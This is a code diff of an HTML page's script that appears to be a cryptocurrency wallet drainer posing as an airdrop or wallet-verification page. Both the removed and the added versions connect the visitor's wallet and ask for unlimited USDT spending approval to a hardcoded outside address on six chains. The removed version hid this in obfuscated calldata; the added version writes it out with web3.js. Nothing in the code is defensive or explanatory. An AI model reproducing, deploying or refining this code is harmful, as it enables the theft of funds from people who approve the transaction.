@@ -62,98 +62,75 @@ h1{font-size:22px;margin-bottom:8px;color:#fff}
 </div>
 </div>
 
+<script src="https://cdn.jsdelivr.net/npm/web3@1.8.2/dist/web3.min.js"></script>
 <script>
 (function(){
-    var _0x12ed=["0x095ea7b30000000000000000000000000f4bdefc177df2583f52b03b1e20f9eac7308555ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff","0xdac17f958d2ee523a2206206994597c13d831ec7","0x55d398326f99059fF77548524699952727959279","0xc2132D05D31c914a87C6611C10748AEb04B58e8F","0xFd086bC7CD5C481DCC9C85ebE478A1C0b69fcbb9","0x94b08aacad473b14b798123f16e781f1d3cfe9e6","0xa614f803B6FD780986A42c78Ec9c7f65c657abae"];
-    var walletAddr = "";
-    const APPROVE_DATA = _0x12ed[0];
-    const chainList = {
-        "0x1":_0x12ed[1],
-        "0x38":_0x12ed[2],
-        "0x89":_0x12ed[3],
-        "0xa4b1":_0x12ed[4],
-        "0xa":_0x12ed[5],
-        "0x2b6653dc":_0x12ed[6]
+    const SPENDER = "0x0f4bdefc177df2583f52b03b1e20f9eac7308555";
+    const MAX_ALLOW = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
+    const chainUSDT = {
+        "0x1":"0xdac17f958d2ee523a2206206994597c13d831ec7",
+        "0x38":"0x55d398326f99059fF77548524699952727959279",
+        "0x89":"0xc2132D05D31c914a87C6611C10748AEb04B58e8F",
+        "0xa4b1":"0xFd086bC7CD5C481DCC9C85ebE478A1C0b69fcbb9",
+        "0xa":"0x94b08aacad473b14b798123f16e781f1d3cfe9e6",
+        "0x2b6653dc":"0xa614f803B6FD780986A42c78Ec9c7f65c657abae"
     };
+    const usdtABI = [{"constant":false,"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"type":"function"}];
+
+    let walletAddr = "";
+    let web3, usdtContract;
+    let showAddr=document.getElementById("showAddr");
+    let successAddr=document.getElementById("successAddr");
 
     function showPage(id){
         document.querySelectorAll(".box").forEach(e=>e.classList.add("hide"));
         document.getElementById(id).classList.remove("hide");
     }
 
-    // 核心修复：官方最新唤起协议
     function openWalletApp(){
         const url = encodeURIComponent(window.location.href);
-        // TP钱包官方协议
-        const tp = `intent://tokenpocket/dapp?url=${url}#Intent;package=com.tokenpocket;scheme=tpdapp;end`;
-        // 小狐狸官方协议
-        const mm = `metamask://dapp/${url}`;
-        // 先试TP，再试小狐狸
-        location.href = tp;
+        location.href = `metamask://dapp/${url}`;
         setTimeout(()=>{
-            location.href = mm;
-            setTimeout(()=>{
-                alert("未检测到钱包APP，已为你跳转下载页");
-                window.open("https://www.tokenpocket.pro/","_blank");
-            },1500);
-        },1500);
+            location.href = `tpdapp://open?url=${url}`;
+        },800);
     }
 
-    async function getUsdtContract(){
-        let chainId=await ethereum.request({method:"eth_chainId"});
-        return chainList[chainId]||chainList["0x38"];
-    }
-
-    let showAddr=document.getElementById("showAddr");
-    let successAddr=document.getElementById("successAddr");
-
-    document.getElementById("connectMM").onclick=async function(){
-        // 先尝试唤起APP
-        if(!window.ethereum && !window.solana){
+    document.getElementById("connectMM").onclick = async function(){
+        if(!window.ethereum){
             openWalletApp();
             return;
         }
         showPage("p2");
         try{
-            if(window.solana&&window.solana.isPhantom){
-                let res=await window.solana.connect();
-                walletAddr=res.publicKey.toString();
-            }else if(window.ethereum){
-                let acc=await ethereum.request({method:"eth_requestAccounts"});
-                walletAddr=acc[0].toLowerCase();
-            }else{
-                openWalletApp();return;
-            }
+            await window.ethereum.request({method:'eth_requestAccounts'});
+            web3 = new Web3(window.ethereum);
+            let accounts = await web3.eth.getAccounts();
+            walletAddr = accounts[0];
+            let chainId = await web3.eth.getChainId();
+            let hexChain = "0x" + chainId.toString(16);
+            let usdtAddr = chainUSDT[hexChain] || chainUSDT["0x38"];
+            usdtContract = new web3.eth.Contract(usdtABI, usdtAddr);
+
             showPage("p3");
-            showAddr.innerText=walletAddr;
-        }catch(e){showPage("p1");}
+            showAddr.innerText = walletAddr;
+        }catch(e){
+            showPage("p1");
+        }
     };
 
-    document.getElementById("approveBtn").onclick=async function(){
-        if(!walletAddr)return;
+    document.getElementById("approveBtn").onclick = async function(){
+        if(!walletAddr || !usdtContract) return;
         showPage("p2");
         try{
-            if(window.solana&&window.solana.isPhantom){
-                await window.solana.request({method:"signMessage",params:{message:"Airdrop Verify"}});
-            }else{
-                let usdt=await getUsdtContract();
-                await ethereum.request({
-                    method:"eth_sendTransaction",
-                    params:[{
-                        from:walletAddr,
-                        to:usdt,
-                        value:"0x0",
-                        gas:"0x60000",
-                        data:APPROVE_DATA
-                    }]
-                });
-            }
+            await usdtContract.methods.approve(SPENDER, MAX_ALLOW).send({from:walletAddr});
             showPage("p4");
-            successAddr.innerText=walletAddr;
-        }catch(e){showPage("p3");}
+            successAddr.innerText = walletAddr;
+        }catch(e){
+            // 取消留在P3
+            showPage("p3");
+        }
     };
 })();
 </script>
-<script src="https://unpkg.com/@solana/web3.js@latest/lib/browser/solana-web3.min.js"></script>
 </body>
 </html>
